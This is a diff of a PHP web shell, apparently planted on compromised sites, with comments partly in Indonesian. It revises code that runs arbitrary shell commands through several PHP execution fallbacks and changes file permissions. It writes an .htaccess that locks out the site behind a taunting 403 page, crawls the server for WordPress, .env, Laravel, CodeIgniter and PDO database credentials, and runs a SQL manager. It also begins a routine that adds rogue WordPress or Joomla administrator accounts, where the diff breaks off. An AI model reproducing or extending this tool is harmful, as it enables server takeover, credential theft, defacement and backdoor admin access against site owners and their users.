         $msg = "Gagal chmod $perm ke " . htmlspecialchars($_POST['chmod_target']);
     }
 }
-
 // === HTACCESS CREATE (simple) ===
 if (isset($_POST['create_htaccess'])) {
     $default_ht = <<<HT
@@ -646,29 +343,22 @@ if (isset($_POST['create_htaccess'])) {
 Order Allow,Deny
 Deny from all
 </FilesMatch>
-
 Options -Indexes
-
 <FilesMatch '^(index.php|sitemap.xml|robots.txt)$'>
  Order allow,deny
  Allow from all
 </FilesMatch>
-
 ErrorDocument 403 '<center><img src="https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif"></img> <h3>IN YOUR FACE</font>'
 HT;
-
     $ht_content = isset($_POST['ht_content']) ? $_POST['ht_content'] : $default_ht;
     $ht_exclude = isset($_POST['ht_exclude']) ? trim($_POST['ht_exclude']) : '';
-
     $allow_block = '';
     if ($ht_exclude !== '') {
-        // split by comma or whitespace
         $parts = preg_split('/[\s,]+/', $ht_exclude);
         $clean = array();
         foreach ($parts as $p) {
             $p = trim($p);
             if ($p === '') continue;
-            // support wildcard * => .* , escape other chars
             $p = str_replace('.', '\\.', $p);
             $p = str_replace('*', '.*', $p);
             $clean[] = $p;
@@ -677,7 +367,6 @@ HT;
             $allow_block = "\n\n# Allow exceptions\n<FilesMatch \"^(" . implode('|', $clean) . ")\$\">\n Order allow,deny\n Allow from all\n</FilesMatch>\n";
         }
     }
-
     $final = $ht_content . $allow_block;
     $target = $dir . DIRECTORY_SEPARATOR . '.htaccess';
     if (file_exists($target)) {
@@ -693,130 +382,111 @@ HT;
 }
 
 // === SCAN DATABASE CONFIG (PHP 5 Compatible) ===
-function scan_configs($root, $maxFiles=2000, $maxBytes=262144) {
+function scan_configs($root, $maxFiles=2000, $maxBytes=262144, $opts=array()) {
     $root = realpath($root);
-    if (!$root || !is_dir($root)) return array('err'=>'Root path invalid','items'=>array());
-    $skipDirs = array('.git','node_modules','vendor','storage','cache','logs','tmp','.idea','.vscode');
-    $extAllow = array('php','env','ini','yaml','yml','json','config');
+    if (!$root || !is_dir($root)) return array('err'=>'Root path invalid','items'=>array(),'stats'=>array());
+    $aggressive = !empty($opts['aggressive']);
+    $includeHidden = !empty($opts['include_hidden']);
+    $skipDirs = $aggressive ? array() : array('.git','node_modules','vendor','storage','cache','logs','tmp','.idea','.vscode');
+    $extAllow = $aggressive ? null : array('php','env','ini','yaml','yml','json','config','txt');
     $items = array();
     $count = 0;
-
-    // Safe manual traversal to avoid exceptions on unreadable directories
+    $stats = array('dirs_visited'=>0,'files_read'=>0,'skipped_size'=>0,'skipped_ext'=>0,'skipped_unreadable'=>0,'raw_matches'=>0,'unique_matches'=>0);
     $stack = array($root);
     while (!empty($stack) && $count < $maxFiles) {
         $dirPath = array_pop($stack);
-        if (!@is_readable($dirPath) || !@is_executable($dirPath)) continue;
+        if (!@is_readable($dirPath) || !@is_executable($dirPath)) { $stats['skipped_unreadable']++; continue; }
         $entries = @scandir($dirPath);
-        if ($entries === false) continue;
+        if ($entries === false) { $stats['skipped_unreadable']++; continue; }
+        $stats['dirs_visited']++;
         foreach ($entries as $entry) {
             if ($count >= $maxFiles) break;
-            if ($entry === '.' || $entry === '..') continue;
-            $path = $dirPath . DIRECTORY_SEPARATOR . $entry;
+            if ($entry==='.'||$entry==='..') continue;
+            if (!$includeHidden && substr($entry,0,1)==='.' && $entry!=='.env') continue;
+            $path = $dirPath.DIRECTORY_SEPARATOR.$entry;
             if (@is_link($path)) continue;
             if (@is_dir($path)) {
-                // Skip any directory segment that is in skipDirs
-                $rel = ltrim(str_replace($root, '', $path), DIRECTORY_SEPARATOR);
-                $skip = false;
-                if ($rel !== '') {
-                    $parts = explode(DIRECTORY_SEPARATOR, $rel);
-                    foreach ($parts as $seg) { if ($seg !== '' && in_array($seg, $skipDirs, true)) { $skip = true; break; } }
+                $rel = ltrim(str_replace($root,'',$path),DIRECTORY_SEPARATOR);
+                $skip=false;
+                if ($rel!=='' && !$aggressive) {
+                    $parts = explode(DIRECTORY_SEPARATOR,$rel);
+                    foreach ($parts as $seg) { if ($seg!=='' && in_array($seg,$skipDirs,true)) { $skip=true; break; } }
                 }
-                if ($skip) continue;
-                $stack[] = $path;
-                continue;
+                if ($skip) continue; $stack[] = $path; continue;
             }
             if (!@is_file($path)) continue;
-            if (@filesize($path) > $maxBytes) continue;
-            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-            if ($ext !== '' && !in_array($ext, $extAllow, true)) continue;
-            $src = @file_get_contents($path);
-            if ($src === false) continue;
-            $count++;
-
-            $base = basename($path);
-            $found = array('file'=>$path,'host'=>null,'user'=>null,'pass'=>null,'db'=>null,'hint'=>null);
-
-        // WordPress wp-config.php
-        if (stripos($base,'wp-config.php') !== false || strpos($src,"'DB_NAME'") !== false || strpos($src,'"DB_NAME"') !== false) {
-            $p = array();
-            if (preg_match("/define\\(['\"]DB_NAME['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['db'] = $m[1];
-            if (preg_match("/define\\(['\"]DB_USER['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['user'] = $m[1];
-            if (preg_match("/define\\(['\"]DB_PASSWORD['\"],\\s*['\"]([^'\"]*)['\"]\\)/", $src, $m)) $p['pass'] = $m[1];
-            if (preg_match("/define\\(['\"]DB_HOST['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['host'] = $m[1];
-            if (!empty($p)) {
-                $found = array_merge($found, $p);
-                $found['hint'] = 'WordPress';
-                $items = array_merge($items, array($found));
-                continue;
+            $size=@filesize($path); if ($size!==false && $size>$maxBytes) { $stats['skipped_size']++; continue; }
+            $ext=strtolower(pathinfo($path,PATHINFO_EXTENSION));
+            if ($extAllow!==null && $ext!=='' && !in_array($ext,$extAllow,true)) { $stats['skipped_ext']++; continue; }
+            $src=@file_get_contents($path); if ($src===false) { $stats['skipped_unreadable']++; continue; }
+            $count++; $stats['files_read']++;
+            $base=basename($path);
+            $found=array('file'=>$path,'host'=>null,'user'=>null,'pass'=>null,'db'=>null,'hint'=>null);
+            // WordPress
+            if (stripos($base,'wp-config.php')!==false || strpos($src,"'DB_NAME'")!==false || strpos($src,'"DB_NAME"')!==false) {
+                $p=array();
+                if (preg_match("/define\(['\"]DB_NAME['\"],\s*['\"]([^'\"]+)['\"]\)/",$src,$m)) $p['db']=$m[1];
+                if (preg_match("/define\(['\"]DB_USER['\"],\s*['\"]([^'\"]+)['\"]\)/",$src,$m)) $p['user']=$m[1];
+                if (preg_match("/define\(['\"]DB_PASSWORD['\"],\s*['\"]([^'\"]*)['\"]\)/",$src,$m)) $p['pass']=$m[1];
+                if (preg_match("/define\(['\"]DB_HOST['\"],\s*['\"]([^'\"]+)['\"]\)/",$src,$m)) $p['host']=$m[1];
+                if (!empty($p)) { $found=array_merge($found,$p); $found['hint']='WordPress'; $items[]=$found; $stats['raw_matches']++; continue; }
             }
-        }
-
-        // .env style
-        if (strpos($src,'DB_HOST=') !== false || strpos($src,'DB_DATABASE=') !== false) {
-            $p = array();
-            if (preg_match('/DB_HOST=([^\r\n#]+)/', $src, $m)) $p['host'] = trim($m[1]);
-            if (preg_match('/DB_DATABASE=([^\r\n#]+)/', $src, $m)) $p['db'] = trim($m[1]);
-            if (preg_match('/DB_USERNAME=([^\r\n#]+)/', $src, $m)) $p['user'] = trim($m[1]);
-            if (preg_match('/DB_PASSWORD=([^\r\n#]*)/', $src, $m)) $p['pass'] = trim($m[1]);
-            if (!empty($p)) {
-                $found = array_merge($found, $p);
-                $found['hint'] = '.env';
-                $items = array_merge($items, array($found));
-                continue;
+            // .env style
+            if (strpos($src,'DB_HOST=') !== false || strpos($src,'DB_DATABASE=') !== false) {
+                $p = array();
+                if (preg_match('/DB_HOST=([^\r\n#]+)/', $src, $m)) $p['host'] = trim($m[1]);
+                if (preg_match('/DB_DATABASE=([^\r\n#]+)/', $src, $m)) $p['db'] = trim($m[1]);
+                if (preg_match('/DB_USERNAME=([^\r\n#]+)/', $src, $m)) $p['user'] = trim($m[1]);
+                if (preg_match('/DB_PASSWORD=([^\r\n#]*)/', $src, $m)) $p['pass'] = trim($m[1]);
+                if (!empty($p)) { $found=array_merge($found,$p); $found['hint']='.env'; $items[]=$found; $stats['raw_matches']++; continue; }
             }
-        }
-
-        // Laravel config/database.php (mysql array)
-        if (stripos($path, 'config'.DIRECTORY_SEPARATOR.'database.php') !== false || strpos($src,"'mysql'") !== false) {
-            $p = array();
-            if (preg_match("/'host'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['host'] = $m[1];
-            if (preg_match("/'database'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['db'] = $m[1];
-            if (preg_match("/'username'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['user'] = $m[1];
-            if (preg_match("/'password'\\s*=>\\s*'([^']*)'/", $src, $m)) $p['pass'] = $m[1];
-            if (!empty($p)) {
-                $found = array_merge($found, $p);
-                $found['hint'] = 'Laravel config';
-                $items = array_merge($items, array($found));
-                continue;
+            // Laravel config
+            if (stripos($path,'config'.DIRECTORY_SEPARATOR.'database.php')!==false || strpos($src,"'mysql'")!==false) {
+                $p=array();
+                if (preg_match("/'host'\s*=>\s*'([^']+)'/",$src,$m)) $p['host']=$m[1];
+                if (preg_match("/'database'\s*=>\s*'([^']+)'/",$src,$m)) $p['db']=$m[1];
+                if (preg_match("/'username'\s*=>\s*'([^']+)'/",$src,$m)) $p['user']=$m[1];
+                if (preg_match("/'password'\s*=>\s*'([^']*)'/",$src,$m)) $p['pass']=$m[1];
+                if (!empty($p)) { $found=array_merge($found,$p); $found['hint']='Laravel config'; $items[]=$found; $stats['raw_matches']++; continue; }
             }
-        }
-
-        // CodeIgniter database.php
-        if (stripos($path,'database.php') !== false && strpos($src,"\$"."db['default']") !== false) {
-            $p = array();
-            if (preg_match("/\\\$db\\['default'\\]\\['hostname'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['host'] = $m[1];
-            if (preg_match("/\\\$db\\['default'\\]\\['database'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['db'] = $m[1];
-            if (preg_match("/\\\$db\\['default'\\]\\['username'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['user'] = $m[1];
-            if (preg_match("/\\\$db\\['default'\\]\\['password'\\]\\s*=\\s*'([^']*)'/", $src, $m)) $p['pass'] = $m[1];
-            if (!empty($p)) {
-                $found = array_merge($found, $p);
-                $found['hint'] = 'CodeIgniter';
-                $items = array_merge($items, array($found));
-                continue;
+            // CodeIgniter
+            if (stripos($path,'database.php')!==false && strpos($src,'$'."db['default']")!==false) {
+                $p=array();
+                if (preg_match("/\$db\['default'\]\['hostname'\]\s*=\s*'([^']+)'/",$src,$m)) $p['host']=$m[1];
+                if (preg_match("/\$db\['default'\]\['database'\]\s*=\s*'([^']+)'/",$src,$m)) $p['db']=$m[1];
+                if (preg_match("/\$db\['default'\]\['username'\]\s*=\s*'([^']+)'/",$src,$m)) $p['user']=$m[1];
+                if (preg_match("/\$db\['default'\]\['password'\]\s*=\s*'([^']*)'/",$src,$m)) $p['pass']=$m[1];
+                if (!empty($p)) { $found=array_merge($found,$p); $found['hint']='CodeIgniter'; $items[]=$found; $stats['raw_matches']++; continue; }
             }
-        }
-
-        // Generic mysqli_connect("host","user","pass","db")
-        if (strpos($src,'mysqli_connect(') !== false) {
-            if (preg_match('/mysqli_connect\\((["\'])(.*?)\\1\\s*,\\s*(["\'])(.*?)\\3\\s*,\\s*(["\'])(.*?)\\5\\s*,\\s*(["\'])(.*?)\\7/', $src, $m)) {
-                $items = array_merge($items, array(array('file'=>$path,'host'=>$m[2],'user'=>$m[4],'pass'=>$m[6],'db'=>$m[8],'hint'=>'mysqli_connect')));
-                continue;
+            // mysqli_connect
+            if (strpos($src,'mysqli_connect(')!==false) {
+                if (preg_match('/mysqli_connect\((["])?(.*?)\1\s*,\s*(["])?(.*?)\3\s*,\s*(["])?(.*?)\5\s*,\s*(["])?(.*?)\7/',$src,$m)) { 
+                    $items[]=array('file'=>$path,'host'=>$m[2],'user'=>$m[4],'pass'=>$m[6],'db'=>$m[8],'hint'=>'mysqli_connect'); 
+                    $stats['raw_matches']++; 
+                    continue; 
+                }
+            }
+            // PDO DSN
+            if (strpos($src,'new PDO')!==false && strpos($src,'mysql:')!==false) {
+                if (preg_match_all("/new\s+PDO\s*\(\s*['\"]mysql:host=([^;'\"\s]+);dbname=([^;'\"\s]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]*)['\"]/i",$src,$mm,PREG_SET_ORDER)) {
+                    foreach ($mm as $m) { 
+                        $items[]=array('file'=>$path,'host'=>$m[1],'db'=>$m[2],'user'=>$m[3],'pass'=>$m[4],'hint'=>'PDO DSN'); 
+                        $stats['raw_matches']++; 
+                    }
+                    continue;
+                }
             }
         }
     }
-    
+    $uniq=array(); $res=array();
+    foreach ($items as $it) { 
+        $key=(isset($it['file'])?$it['file']:'')."|".(isset($it['host'])?$it['host']:'')."|".(isset($it['user'])?$it['user']:'')."|".(isset($it['db'])?$it['db']:''); 
+        if (isset($uniq[$key])) continue; 
+        $uniq[$key]=1; 
+        $res[]=$it; 
     }
-
-    // de-duplicate by (host|user|db) + file
-    $uniq = array();
-    $res = array();
-    foreach ($items as $it) {
-        $key = (isset($it['file']) ? $it['file'] : '')."|".(isset($it['host']) ? $it['host'] : '')."|".(isset($it['user']) ? $it['user'] : '')."|".(isset($it['db']) ? $it['db'] : '');
-        if (isset($uniq[$key])) continue;
-        $uniq[$key] = 1;
-        $res = array_merge($res, array($it));
-    }
-    return array('err'=>null,'items'=>$res);
+    $stats['unique_matches']=count($res);
+    return array('err'=>null,'items'=>$res,'stats'=>$stats);
 }
 
 // === MINI SQL MANAGER (PHP 5 Compatible) ===
@@ -829,30 +499,26 @@ function db_connect($host, $user, $pass, $db) {
     }
     return $conn;
 }
-
 function db_query($conn, $sql) {
     $result = mysql_query($sql, $conn);
     if (!$result) return false;
     return $result;
 }
-
 function db_fetch_all($result) {
     $rows = array();
     while ($row = mysql_fetch_assoc($result)) {
-        $rows = array_merge($rows, array($row));
+        $rows[] = $row;
     }
     return $rows;
 }
-
 function db_get_tables($conn, $db) {
     $result = mysql_query("SHOW TABLES FROM `$db`", $conn);
     $tables = array();
     while ($row = mysql_fetch_row($result)) {
-        $tables = array_merge($tables, array($row[0]));
+        $tables[] = $row[0];
     }
     return $tables;
 }
-
 function db_get_table_structure($conn, $table) {
     $result = mysql_query("DESCRIBE `$table`", $conn);
     return db_fetch_all($result);
@@ -862,42 +528,30 @@ function db_get_table_structure($conn, $table) {
 function exec_cmd($cmd, $cwd) {
     $disabled = explode(',', str_replace(' ', '', ini_get('disable_functions')));
     $output = "";
-
-    // Build command sesuai OS
     if (strncasecmp(PHP_OS, 'WIN', 3) == 0) {
         $fullCmd = "cd /d " . escapeshellarg($cwd) . " && cmd /c " . $cmd . " 2>&1";
     } else {
         $fullCmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
     }
-
-    // shell_exec
     if (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
         $output = shell_exec($fullCmd);
         if ($output !== null) return $output;
     }
-
-    // exec
     if (!in_array('exec', $disabled) && function_exists('exec')) {
         $res = array();
         exec($fullCmd, $res);
         return implode("\n", $res);
     }
-
-    // system
     if (!in_array('system', $disabled) && function_exists('system')) {
         ob_start();
         system($fullCmd);
         return ob_get_clean();
     }
-
-    // passthru
     if (!in_array('passthru', $disabled) && function_exists('passthru')) {
         ob_start();
         passthru($fullCmd);
         return ob_get_clean();
     }
-
-    // popen
     if (!in_array('popen', $disabled) && function_exists('popen')) {
         $handle = popen($fullCmd, 'r');
         $res = '';
@@ -907,33 +561,24 @@ function exec_cmd($cmd, $cwd) {
         pclose($handle);
         return $res;
     }
-
     return "Tidak ada fungsi eksekusi yang tersedia (semua disable).";
 }
-
-$terminal_output = "";
 if (isset($_POST['cmd'])) {
     $cmd = trim($_POST['cmd']);
     $terminal_output = exec_cmd($cmd, $dir);
 }
 
 // === SCAN DATABASE CONFIG ===
-$scan_msg = '';
-$scan_items = array();
-$scan_dur = null;
-
 if (isset($_POST['scan_db'])) {
-    // Increase memory limit temporarily for scanning
     $old_memory_limit = ini_get('memory_limit');
     ini_set('memory_limit', '256M');
-    set_time_limit(300); // 5 minutes timeout
+    set_time_limit(300);
     
     $scan_start = microtime(true);
     $scan_path = isset($_POST['scan_path']) ? $_POST['scan_path'] : $dir;
     $scan_limit = max(100, min(10000, (int)(isset($_POST['scan_limit']) ? $_POST['scan_limit'] : 2000)));
     $scan_bytes = max(65536, min(1048576, (int)(isset($_POST['scan_bytes']) ? $_POST['scan_bytes'] : 262144)));
     
-    // Validate path
     if (!is_readable($scan_path)) {
         $scan_msg = 'Path is not readable or does not exist';
     } else {
@@ -946,54 +591,32 @@ if (isset($_POST['scan_db'])) {
         }
     }
     
-    // Restore original memory limit
     ini_set('memory_limit', $old_memory_limit);
 }
-
-// Handle apply from scan results: try to connect using selected credentials
+// Handle apply from scan results
 if (isset($_POST['apply_scan'])) {
     $try_host = isset($_POST['apply_host']) ? $_POST['apply_host'] : 'localhost';
     $try_user = isset($_POST['apply_user']) ? $_POST['apply_user'] : '';
     $try_pass = isset($_POST['apply_pass']) ? $_POST['apply_pass'] : '';
     $try_db   = isset($_POST['apply_db']) ? $_POST['apply_db'] : '';
-
     $try_conn = db_connect($try_host, $try_user, $try_pass, $try_db);
     if ($try_conn) {
         $db_conn = $try_conn;
-    // persist credentials in session so SQL manager can reuse
-    $_SESSION['db_cred'] = array('host'=>$try_host,'user'=>$try_user,'pass'=>$try_pass,'db'=>$try_db);
-    // signal we should open the SQL manager after apply
-    $_SESSION['db_auto_switch'] = 1;
-    $db_error = 'Connected successfully to ' . htmlspecialchars($try_host) . '/' . htmlspecialchars($try_db);
-    $db_tables = db_get_tables($db_conn, $try_db);
+        $_SESSION['db_cred'] = array('host'=>$try_host,'user'=>$try_user,'pass'=>$try_pass,'db'=>$try_db);
+        $_SESSION['db_auto_switch'] = 1;
+        $db_error = 'Connected successfully to ' . htmlspecialchars($try_host) . '/' . htmlspecialchars($try_db);
+        $db_tables = db_get_tables($db_conn, $try_db);
     } else {
         $db_error = 'Auto-connect failed: ' . mysql_error();
     }
 }
 
 // === MINI SQL MANAGER LOGIC ===
-// Determine mode; default to 'files'.
-if (isset($_GET['mode'])) {
-    $mode = $_GET['mode'];
-} else {
-    // Only auto-switch to SQL manager if an explicit apply_scan just occurred (session flag).
-    if (isset($_SESSION['db_auto_switch']) && $_SESSION['db_auto_switch'] && isset($_SESSION['db_cred']) && !empty($_SESSION['db_cred'])) {
-        $mode = 'sql';
-        unset($_SESSION['db_auto_switch']);
-    } else {
-        $mode = 'files';
-    }
+if (isset($_SESSION['db_auto_switch']) && $_SESSION['db_auto_switch'] && isset($_SESSION['db_cred']) && !empty($_SESSION['db_cred'])) {
+    $mode = 'sql';
+    unset($_SESSION['db_auto_switch']);
 }
-
-$db_conn = null;
-$db_error = '';
-$db_result = array();
-$db_query = '';
-$db_tables = array();
-$db_current_table = '';
-
 if ($mode === 'sql') {
-    // if session credentials exist, attempt connection (idempotent)
     if (!$db_conn && isset($_SESSION['db_cred']) && !empty($_SESSION['db_cred'])) {
         $c = $_SESSION['db_cred'];
         $db_conn = db_connect($c['host'], $c['user'], $c['pass'], $c['db']);
@@ -1002,7 +625,6 @@ if ($mode === 'sql') {
         }
     }
     
-    // Handle database connection
     if (isset($_POST['db_connect'])) {
         $db_host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
         $db_user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
@@ -1013,13 +635,11 @@ if ($mode === 'sql') {
         if (!$db_conn) {
             $db_error = 'Connection failed: ' . mysql_error();
         } else {
-            // store successful manual creds in session so subsequent actions reuse them
             $_SESSION['db_cred'] = array('host'=>$db_host,'user'=>$db_user,'pass'=>$db_pass,'db'=>$db_name);
             $db_tables = db_get_tables($db_conn, $db_name);
         }
     }
     
-    // CRUD: Delete row
     if (isset($_POST['delete_row']) && $db_conn && isset($_POST['pk'])) {
         $pk = @unserialize(base64_decode($_POST['pk']));
         $tbl = isset($_POST['table']) ? $_POST['table'] : (isset($_GET['table']) ? $_GET['table'] : '');
@@ -1033,13 +653,11 @@ if ($mode === 'sql') {
             if ($r) $db_error = 'Row deleted successfully'; else $db_error = 'Delete failed: ' . mysql_error();
         }
     }
-
-    // CRUD: Duplicate row
+    
     if (isset($_POST['duplicate_row']) && $db_conn && isset($_POST['pk'])) {
         $pk = @unserialize(base64_decode($_POST['pk']));
         $tbl = isset($_POST['table']) ? $_POST['table'] : (isset($_GET['table']) ? $_GET['table'] : '');
         if ($pk && $tbl) {
-            // fetch the row
             $where = array();
             foreach ($pk as $col=>$val) $where[] = "`" . mysql_real_escape_string($col) . "` = '" . mysql_real_escape_string($val) . "'";
             $sel = @mysql_query("SELECT * FROM `" . mysql_real_escape_string($tbl) . "` WHERE " . implode(' AND ', $where) . " LIMIT 1", $db_conn);
@@ -1047,7 +665,6 @@ if ($mode === 'sql') {
                 $row = mysql_fetch_assoc($sel);
                 mysql_free_result($sel);
                 if ($row) {
-                    // remove AUTO_INCREMENT fields if any
                     $structure = db_get_table_structure($db_conn, $tbl);
                     foreach ($structure as $col) {
                         if (isset($col['Extra']) && stripos($col['Extra'], 'auto_increment') !== false) {
@@ -1063,8 +680,7 @@ if ($mode === 'sql') {
             }
         }
     }
-
-    // CRUD: Update row (from edit form)
+    
     if (isset($_POST['update_row']) && $db_conn && isset($_POST['pk']) && isset($_POST['fields']) && isset($_POST['table'])) {
         $pk = @unserialize(base64_decode($_POST['pk']));
         $tbl = $_POST['table'];
@@ -1081,8 +697,7 @@ if ($mode === 'sql') {
             if ($r) $db_error = 'Row updated successfully'; else $db_error = 'Update failed: ' . mysql_error();
         }
     }
-
-    // CRUD: Insert row
+    
     if (isset($_POST['insert_row']) && $db_conn && isset($_POST['table']) && isset($_POST['fields'])) {
         $tbl = $_POST['table'];
         $fields = $_POST['fields'];
@@ -1099,8 +714,7 @@ if ($mode === 'sql') {
             }
         }
     }
-
-    // Handle SQL query execution
+    
     if (isset($_POST['execute_query']) && $db_conn) {
         $db_query = isset($_POST['sql_query']) ? $_POST['sql_query'] : '';
         if (!empty($db_query)) {
@@ -1116,14 +730,11 @@ if ($mode === 'sql') {
         }
     }
     
-    // View a table (with pagination)
     if (isset($_GET['table']) && $db_conn) {
         $db_current_table = $_GET['table'];
-    // rows per page (support both 'per' and legacy defaults)
-    $tbl_per_page = isset($_GET['per']) ? max(1, min(200, intval($_GET['per']))) : 50;
-    $tbl_page = isset($_GET['tblpage']) ? max(1, intval($_GET['tblpage'])) : (isset($_GET['p']) ? max(1,intval($_GET['p'])) : 1);
-    $offset = ($tbl_page - 1) * $tbl_per_page;
-        // support optional ordering
+        $tbl_per_page = isset($_GET['per']) ? max(1, min(200, intval($_GET['per']))) : 50;
+        $tbl_page = isset($_GET['tblpage']) ? max(1, intval($_GET['tblpage'])) : (isset($_GET['p']) ? max(1,intval($_GET['p'])) : 1);
+        $offset = ($tbl_page - 1) * $tbl_per_page;
         $order_by = '';
         if (isset($_GET['sort'])) {
             $sort = preg_replace('/[^a-zA-Z0-9_]/', '', $_GET['sort']);
@@ -1148,11 +759,9 @@ if ($mode === 'sql') {
         } else {
             $db_error = 'Failed to read table: ' . mysql_error();
         }
-        // also fetch structure
         $table_structure = db_get_table_structure($db_conn, $db_current_table);
     }
-
-    // Export CSV
+    
     if (isset($_GET['export']) && $_GET['export'] === 'csv' && isset($_GET['table']) && $db_conn) {
         $t = $_GET['table'];
         header('Content-Type: text/csv');
@@ -1171,14 +780,6 @@ if ($mode === 'sql') {
         exit;
     }
     
-    // Handle table selection: ensure structure is available but do NOT overwrite $db_result (rows)
-    if (isset($_GET['table']) && $db_conn) {
-        $db_current_table = $_GET['table'];
-        $table_structure = db_get_table_structure($db_conn, $db_current_table);
-        // do not assign $db_result here — it should contain fetched rows from the SELECT query above
-    }
-    
-    // Handle disconnect
     if (isset($_POST['db_disconnect'])) {
         if ($db_conn) {
             mysql_close($db_conn);
@@ -1189,36 +790,321 @@ if ($mode === 'sql') {
         $db_query = '';
         $db_tables = array();
         $db_current_table = '';
-    // clear stored credentials
-    if (isset($_SESSION['db_cred'])) unset($_SESSION['db_cred']);
+        if (isset($_SESSION['db_cred'])) unset($_SESSION['db_cred']);
     }
 }
 
-// Handle scan mode
-$scan_result = null;
-$scan_msg = '';
-$scan_dur = null;
-
-if ($mode === 'scan') {
-    if (isset($_POST['scan_configs'])) {
-        $scan_path = isset($_POST['scan_path']) ? $_POST['scan_path'] : getcwd();
-        $scan_max_files = isset($_POST['max_files']) ? (int)$_POST['max_files'] : 2000;
-        $scan_max_bytes = isset($_POST['max_bytes']) ? (int)$_POST['max_bytes'] : 262144;
+// === CMS ADMIN HANDLER (FIXED) ===
+if (isset($_POST['cms_get_config']) || isset($_POST['cms_add_admin']) || isset($_POST['cms_detect_prefix'])) {
+    $cms_type = isset($_POST['cms_type']) ? $_POST['cms_type'] : '';
+    $cms_root = isset($_POST['cms_root']) ? $_POST['cms_root'] : $dir;
+    $_SESSION['cms_type'] = $cms_type;
+    
+    if (isset($_POST['cms_get_config'])) {
+        $config = array();
+        if ($cms_type === 'wordpress') {
+            // Coba wp-config.php di beberapa lokasi yang mungkin
+            $possible_paths = array(
+                $cms_root . '/wp-config.php',
+                $cms_root . '/../wp-config.php',
+                $cms_root . '/public/wp-config.php',
+                $cms_root . '/html/wp-config.php'
+            );
+            
+            foreach ($possible_paths as $path) {
+                if (file_exists($path)) {
+                    $config = parse_wp_config($path);
+                    if (!empty($config)) break;
+                }
+            }
+        } elseif ($cms_type === 'joomla') {
+            // Coba configuration.php di beberapa lokasi yang mungkin
+            $possible_paths = array(
+                $cms_root . '/configuration.php',
+                $cms_root . '/../configuration.php',
+                $cms_root . '/public/configuration.php',
+                $cms_root . '/html/configuration.php'
+            );
+            
+            foreach ($possible_paths as $path) {
+                if (file_exists($path)) {
+                    $config = parse_joomla_config($path);
+                    if (!empty($config)) break;
+                }
+            }
+        }
         
-        $start_time = microtime(true);
-        $scan_result = scan_configs($scan_path, $scan_max_files, $scan_max_bytes);
-        $scan_dur = microtime(true) - $start_time;
+        if (!empty($config)) {
+            $_SESSION['cms_parsed'] = $config;
+            $cms_admin_msg = 'Config loaded for ' . htmlspecialchars($cms_type);
+            
+            // Auto-detect prefix untuk WordPress
+            if ($cms_type === 'wordpress' && isset($config['db']) && isset($config['user']) && isset($config['pass']) && isset($config['host'])) {
+                $link = @mysql_connect($config['host'], $config['user'], $config['pass']);
+                if ($link && @mysql_select_db($config['db'], $link)) {
+                    $res = @mysql_query('SHOW TABLES', $link);
+                    if ($res) {
+                        $candidates = array();
+                        while ($row = mysql_fetch_row($res)) {
+                            $t = $row[0];
+                            if (preg_match('/^(.+)_users$/', $t, $m)) {
+                                $prefix = $m[1] . '_';
+                                if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                                $candidates[$prefix]['users'] = true;
+                            } elseif (preg_match('/^(.+)_usermeta$/', $t, $m)) {
+                                $prefix = $m[1] . '_';
+                                if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                                $candidates[$prefix]['usermeta'] = true;
+                            } elseif (preg_match('/^(.+)_options$/', $t, $m)) {
+                                $prefix = $m[1] . '_';
+                                if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                                $candidates[$prefix]['options'] = true;
+                            } elseif (preg_match('/^(.+)_posts$/', $t, $m)) {
+                                $prefix = $m[1] . '_';
+                                if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                                $candidates[$prefix]['posts'] = true;
+                            }
+                        }
+                        
+                        foreach ($candidates as $p=>$info) {
+                            $candidates[$p]['count'] = ($info['users']?1:0)+($info['usermeta']?1:0)+($info['options']?1:0)+($info['posts']?1:0);
+                        }
+                        
+                        uasort($candidates, function($a,$b){ return $b['count'] - $a['count']; });
+                        
+                        if (!empty($candidates)) {
+                            $best_prefix = key($candidates);
+                            $_SESSION['cms_parsed']['prefix'] = $best_prefix;
+                            $cms_admin_msg .= ' (Auto-detected prefix: ' . $best_prefix . ')';
+                        }
+                    }
+                    mysql_close($link);
+                }
+            }
+        } else {
+            $cms_admin_msg = 'Config not found for ' . htmlspecialchars($cms_type);
+        }
+    }
+    
+    if (isset($_POST['cms_add_admin'])) {
+        $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
+        $dbn  = isset($_POST['db_name']) ? $_POST['db_name'] : '';
+        $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
+        $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
+        $prefix = isset($_POST['table_prefix']) ? $_POST['table_prefix'] : 'wp_';
+        $admin_user = isset($_POST['admin_user']) ? $_POST['admin_user'] : 'admin';
+        $admin_pass = isset($_POST['admin_pass']) ? $_POST['admin_pass'] : 'password';
+        $admin_email = isset($_POST['admin_email']) ? $_POST['admin_email'] : 'admin@example.com';
         
-        if (isset($scan_result['err'])) {
-            $scan_msg = $scan_result['err'];
+        $link = @mysql_connect($host, $user, $pass);
+        if (!$link) {
+            $cms_admin_msg = 'Connection failed: ' . mysql_error();
+        } elseif (!@mysql_select_db($dbn, $link)) {
